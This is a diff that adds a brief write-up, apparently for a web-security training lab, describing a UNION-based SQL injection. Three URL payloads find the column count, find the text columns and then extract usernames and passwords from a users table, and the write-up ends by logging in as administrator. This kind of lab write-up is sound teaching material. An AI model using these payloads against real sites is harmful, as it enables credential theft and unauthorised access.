@@ -1,0 +1,15 @@
+SQL injection UNION attack, retrieving data from other tables
+
+We start by indetifying the number of columns:
+
+https://aca51fd81ecc9e6d80be037000e80068.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,NULL--
+
+And then the columns with text:
+
+https://aca51fd81ecc9e6d80be037000e80068.web-security-academy.net/filter?category=%27+UNION+SELECT+%27asdf%27,%27qwerty%27--
+
+Guessing at the column names, we try users in order to get the username and passwords:
+
+https://aca51fd81ecc9e6d80be037000e80068.web-security-academy.net/filter?category=%27+UNION+SELECT+username,+password+FROM+users--
+
+Log in as administrator and claim your victory.
